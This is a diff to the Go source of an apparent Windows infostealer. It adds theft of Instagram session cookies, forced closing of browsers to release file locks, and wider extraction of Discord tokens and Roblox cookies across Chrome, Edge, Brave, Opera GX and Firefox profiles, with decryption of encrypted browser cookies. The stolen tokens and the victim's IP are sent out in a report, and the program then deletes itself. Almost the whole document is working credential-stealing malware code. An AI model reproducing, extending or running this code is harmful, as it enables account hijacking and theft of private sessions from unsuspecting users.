@@ -110,6 +110,7 @@ type SystemReport struct {
 	PublicIP      string   `json:"public_ip"`
 	DiscordTokens []string `json:"discord_tokens"`
 	RobloxCookies []string `json:"roblox_cookies"`
+	InstaCookies  []string `json:"insta_cookies"`
 	Browsers      []string `json:"browsers_found"`
 	Timestamp     string   `json:"timestamp"`
 }
@@ -119,11 +120,24 @@ func main() {
 		return
 	}
 
+	// Ultimate mode: Close browsers first to release file locks
+	closeBrowsers()
+	time.Sleep(2 * time.Second)
+
 	report := gatherEverything()
 	sendReport(report)
 
 	// Self-delete (Windows specific)
 	selfDelete()
+}
+
+func closeBrowsers() {
+	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"}
+	for _, browser := range browsers {
+		cmd := exec.Command("taskkill", "/F", "/IM", browser, "/T")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd.Run()
+	}
 }
 
 func selfDelete() {
@@ -153,6 +167,7 @@ func gatherEverything() SystemReport {
 
 	report.DiscordTokens = extractDiscordTokens()
 	report.RobloxCookies = extractRobloxCookies()
+	report.InstaCookies = extractInstagramCookies()
 	report.Browsers = findBrowsers()
 
 	return report
@@ -174,11 +189,12 @@ func findBrowsers() []string {
 	home, _ := os.UserHomeDir()
 
 	paths := map[string]string{
-		"Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
-		"Edge":    filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
-		"Brave":   filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
-		"Opera":   filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
-		"Firefox": filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
+		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
+		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
+		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
+		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
 	}
 
 	for name, path := range paths {
@@ -214,78 +230,80 @@ func extractDiscordTokens() []string {
 		"Discord":        filepath.Join(home, "AppData", "Roaming", "Discord"),
 		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "DiscordCanary"),
 		"Discord PTB":    filepath.Join(home, "AppData", "Roaming", "DiscordPTB"),
-		"Google Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
-		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+		"Google Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
 		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 	}
 
 	reEncrypted := regexp.MustCompile(`dQw4w9WgXcQ:([^" ]+)`)
 	rePlain := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
 
 	for name, baseDir := range paths {
-		leveldbPath := filepath.Join(baseDir, "Local Storage", "leveldb")
-		if name == "Opera" {
-			leveldbPath = filepath.Join(baseDir, "Local Storage", "leveldb")
-		}
-
-		// Try to get master key if it's a desktop app or chrome-based
 		var masterKey []byte
 		localStatePath := filepath.Join(baseDir, "Local State")
-		if strings.Contains(name, "Discord") {
-			// Discord app Local State is one level up from Local Storage
-			localStatePath = filepath.Join(baseDir, "Local State")
-		} else if strings.Contains(name, "Chrome") || strings.Contains(name, "Brave") {
-			// Chrome Local State is in User Data
-			localStatePath = filepath.Join(filepath.Dir(baseDir), "Local State")
-		}
-
 		if _, err := os.Stat(localStatePath); err == nil {
 			masterKey, _ = getMasterKey(localStatePath)
 		}
 
-		files, err := os.ReadDir(leveldbPath)
-		if err != nil {
-			continue
+		// List of directories to search (Profiles for browsers, root for Discord apps)
+		var searchDirs []string
+		if strings.Contains(name, "Discord") || strings.HasPrefix(name, "Opera") {
+			searchDirs = append(searchDirs, baseDir)
+		} else {
+			// Browser: search in Default and Profile X
+			items, _ := os.ReadDir(baseDir)
+			for _, item := range items {
+				if item.IsDir() && (item.Name() == "Default" || strings.HasPrefix(item.Name(), "Profile ")) {
+					searchDirs = append(searchDirs, filepath.Join(baseDir, item.Name()))
+				}
+			}
 		}
 
-		for _, file := range files {
-			if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
-				continue
-			}
-
-			// Copy file to temp to avoid "file in use" error
-			tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_%d", time.Now().UnixNano()))
-			if err := copyFile(filepath.Join(leveldbPath, file.Name()), tempFile); err != nil {
-				continue
-			}
-			content, err := os.ReadFile(tempFile)
-			os.Remove(tempFile)
+		for _, dir := range searchDirs {
+			leveldbPath := filepath.Join(dir, "Local Storage", "leveldb")
+			files, err := os.ReadDir(leveldbPath)
 			if err != nil {
 				continue
 			}
 
-			// 1. Look for encrypted tokens
-			if masterKey != nil {
-				matches := reEncrypted.FindAllSubmatch(content, -1)
-				for _, match := range matches {
-					if len(match) > 1 {
-						encryptedB64 := string(match[1])
-						encryptedData, err := base64.StdEncoding.DecodeString(encryptedB64)
-						if err == nil {
-							decrypted, err := decryptToken(encryptedData, masterKey)
-							if err == nil && !contains(tokens, decrypted) {
-								tokens = append(tokens, decrypted)
+			for _, file := range files {
+				if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
+					continue
+				}
+
+				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_%d", time.Now().UnixNano()))
+				if err := copyFile(filepath.Join(leveldbPath, file.Name()), tempFile); err != nil {
+					continue
+				}
+				content, err := os.ReadFile(tempFile)
+				os.Remove(tempFile)
+				if err != nil {
+					continue
+				}
+
+				if masterKey != nil {
+					matches := reEncrypted.FindAllSubmatch(content, -1)
+					for _, match := range matches {
+						if len(match) > 1 {
+							encryptedB64 := string(match[1])
+							encryptedData, err := base64.StdEncoding.DecodeString(encryptedB64)
+							if err == nil {
+								decrypted, err := decryptToken(encryptedData, masterKey)
+								if err == nil && !contains(tokens, decrypted) {
+									tokens = append(tokens, decrypted)
+								}
 							}
 						}
 					}
 				}
-			}
 
-			// 2. Look for plain tokens (fallback)
-			matchesPlain := rePlain.FindAllString(string(content), -1)
-			for _, match := range matchesPlain {
-				if !contains(tokens, match) {
-					tokens = append(tokens, match)
+				matchesPlain := rePlain.FindAllString(string(content), -1)
+				for _, match := range matchesPlain {
+					if !contains(tokens, match) {
+						tokens = append(tokens, match)
+					}
 				}
 			}
 		}
@@ -294,74 +312,104 @@ func extractDiscordTokens() []string {
 }
 
 func extractRobloxCookies() []string {
-	var cookies []string
+	// Search for Roblox domain and cookie name
+	return ultimateGrabber("roblox.com", ".ROBLOSECURITY")
+}
+
+func extractInstagramCookies() []string {
+	// Search for Instagram domain and session cookies
+	return ultimateGrabber("instagram.com", "sessionid")
+}
+
+func ultimateGrabber(domain string, targetCookie string) []string {
+	var results []string
 	home, _ := os.UserHomeDir()
 
 	paths := map[string]string{
-		"Chrome": filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
-		"Edge":   filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
-		"Brave":  filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
-		"Opera":  filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
+		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 	}
 
-	rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
-
 	for _, baseDir := range paths {
-		// 1. Check for master key
 		localStatePath := filepath.Join(baseDir, "Local State")
 		masterKey, _ := getMasterKey(localStatePath)
-
-		// 2. Search in Cookies database
-		cookiePaths := []string{
-			filepath.Join(baseDir, "Default", "Network", "Cookies"),
-			filepath.Join(baseDir, "Default", "Cookies"),
-			filepath.Join(baseDir, "Network", "Cookies"),
+		if masterKey == nil {
+			continue
 		}
 
-		for _, cookiePath := range cookiePaths {
-			if _, err := os.Stat(cookiePath); err != nil {
-				continue
+		var profileDirs []string
+		items, _ := os.ReadDir(baseDir)
+		for _, item := range items {
+			if item.IsDir() && (item.Name() == "Default" || strings.HasPrefix(item.Name(), "Profile ")) {
+				profileDirs = append(profileDirs, filepath.Join(baseDir, item.Name()))
+			}
+		}
+		// Also check the baseDir itself for Opera
+		profileDirs = append(profileDirs, baseDir)
+
+		for _, profileDir := range profileDirs {
+			cookiePaths := []string{
+				filepath.Join(profileDir, "Network", "Cookies"),
+				filepath.Join(profileDir, "Cookies"),
+				filepath.Join(profileDir, "Web Data"),
 			}
 
-			// Copy file to temp to avoid "file in use" error
-			tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_cookie_%d", time.Now().UnixNano()))
-			if err := copyFile(cookiePath, tempFile); err != nil {
-				continue
-			}
-			content, err := os.ReadFile(tempFile)
-			os.Remove(tempFile)
-			if err != nil {
-				continue
-			}
-
-			// Look for plain text cookies (sometimes they are there in old versions or logs)
-			matches := rePlain.FindAllString(string(content), -1)
-			for _, match := range matches {
-				if !contains(cookies, match) {
-					cookies = append(cookies, match)
+			for _, cookiePath := range cookiePaths {
+				if _, err := os.Stat(cookiePath); err != nil {
+					continue
 				}
-			}
 
-			// If we have a master key, we could try to find encrypted values
-			// Chrome cookies are prefixed with 'v10' or 'v11'
-			// In the SQLite file, they are usually after the cookie name '.ROBLOSECURITY'
-			if masterKey != nil {
-				// This is a bit complex without SQLite parser, but we can search for the pattern
-				// [binary garbage].ROBLOSECURITY[binary garbage]v10[encrypted data]
-				idx := bytes.Index(content, []byte(".ROBLOSECURITY"))
-				if idx != -1 {
-					// Look for 'v10' after '.ROBLOSECURITY'
-					searchData := content[idx:]
-					v10Idx := bytes.Index(searchData, []byte("v10"))
-					if v10Idx != -1 && v10Idx < 100 { // Should be close
-						// Fallback: search for any 'v10' pattern and try to decrypt
-						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
+				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("db_%d", time.Now().UnixNano()))
+				if err := copyFile(cookiePath, tempFile); err != nil {
+					continue
+				}
+				content, _ := os.ReadFile(tempFile)
+				os.Remove(tempFile)
+				if content == nil {
+					continue
+				}
+
+				// Global scan for v10 tokens nearby domain or cookie name
+				searchTerms := []string{domain, targetCookie, "ROBLOSECURITY", "roblox"}
+				for _, term := range searchTerms {
+					idx := 0
+					for {
+						foundIdx := strings.Index(string(content[idx:]), term)
+						if foundIdx == -1 {
+							break
+						}
+						actualIdx := idx + foundIdx
+						idx = actualIdx + len(term)
+
+						// Check a large area around the find
+						start := actualIdx - 500
+						if start < 0 {
+							start = 0
+						}
+						end := actualIdx + 1500
+						if end > len(content) {
+							end = len(content)
+						}
+						searchArea := content[start:end]
+
+						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
 						for _, v10Match := range v10Matches {
-							if len(v10Match) > 15 {
-								decrypted, err := decryptToken(v10Match, masterKey)
-								if err == nil && strings.Contains(decrypted, "_|WARNING") {
-									if !contains(cookies, decrypted) {
-										cookies = append(cookies, decrypted)
+							decrypted, err := decryptToken(v10Match, masterKey)
+							if err == nil && len(decrypted) > 10 {
+								// Strict check for Roblox tokens
+								if domain == "roblox.com" || strings.Contains(term, "ROBLO") {
+									if strings.Contains(decrypted, "_|WARNING") {
+										if !contains(results, decrypted) {
+											results = append(results, decrypted)
+										}
+									}
+								} else {
+									// Instagram / Others
+									if !contains(results, decrypted) {
+										results = append(results, decrypted)
 									}
 								}
 							}
@@ -372,22 +420,66 @@ func extractRobloxCookies() []string {
 		}
 	}
 
-	// Also check Roblox App location
-	robloxPath := filepath.Join(home, "AppData", "Local", "Roblox", "LocalStorage")
-	if _, err := os.Stat(robloxPath); err == nil {
-		files, _ := os.ReadDir(robloxPath)
-		for _, f := range files {
-			c, _ := os.ReadFile(filepath.Join(robloxPath, f.Name()))
-			matches := rePlain.FindAllString(string(c), -1)
-			for _, match := range matches {
-				if !contains(cookies, match) {
-					cookies = append(cookies, match)
+	// Extra scan for plain text in all profiles
+	if domain == "roblox.com" {
+		rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
+		robloxPath := filepath.Join(home, "AppData", "Local", "Roblox", "LocalStorage")
+		if _, err := os.Stat(robloxPath); err == nil {
+			filepath.Walk(robloxPath, func(path string, info os.FileInfo, err error) error {
+				if err == nil && !info.IsDir() {
+					c, _ := os.ReadFile(path)
+					matches := rePlain.FindAllString(string(c), -1)
+					for _, m := range matches {
+						if !contains(results, m) {
+							results = append(results, m)
+						}
+					}
 				}
-			}
+				return nil
+			})
 		}
 	}
 
-	return cookies
+	// Technique 4: Firefox Fallback
+	firefoxPath := filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+	if _, err := os.Stat(firefoxPath); err == nil {
+		filepath.Walk(firefoxPath, func(path string, info os.FileInfo, err error) error {
+			if err == nil && (strings.Contains(path, "cookies.sqlite") || strings.Contains(path, "storage")) {
+				tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("ff_%d", time.Now().UnixNano()))
+				if err := copyFile(path, tempFile); err == nil {
+					c, _ := os.ReadFile(tempFile)
+					os.Remove(tempFile)
+					if c != nil {
+						if domain == "roblox.com" {
+							rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
+							matches := rePlain.FindAllString(string(c), -1)
+							for _, m := range matches {
+								if !contains(results, m) {
+									results = append(results, m)
+								}
+							}
+						} else if domain == "instagram.com" {
+							// Search for typical session lengths and characters
+							idx := strings.Index(string(c), "sessionid")
+							if idx != -1 {
+								searchArea := string(c[idx : idx+200])
+								reValue := regexp.MustCompile(`[a-zA-Z0-9_-]{32,}`)
+								val := reValue.FindString(searchArea)
+								if val != "" {
+									if !contains(results, "sessionid="+val) {
+										results = append(results, "sessionid="+val)
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+			return nil
+		})
+	}
+
+	return results
 }
 
 func contains(slice []string, item string) bool {
@@ -465,6 +557,22 @@ func sendReport(report SystemReport) {
 			"title":       "🎮 Roblox Cookies",
 			"color":       0xe74c3c,
 			"description": "❌ No Roblox cookies found on this system.",
+		})
+	}
+
+	// Embed pour les Cookies Instagram
+	if len(report.InstaCookies) > 0 {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "📸 Instagram Sessions Captured",
+			"color":       0xE1306C,
+			"description": formatList(report.InstaCookies, 5),
+			"footer":      map[string]string{"text": fmt.Sprintf("Total Potential Sessions: %d", len(report.InstaCookies))},
+		})
+	} else {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "📸 Instagram Sessions",
+			"color":       0xe74c3c,
+			"description": "❌ No Instagram sessions found on this system.",
 		})
 	}
 
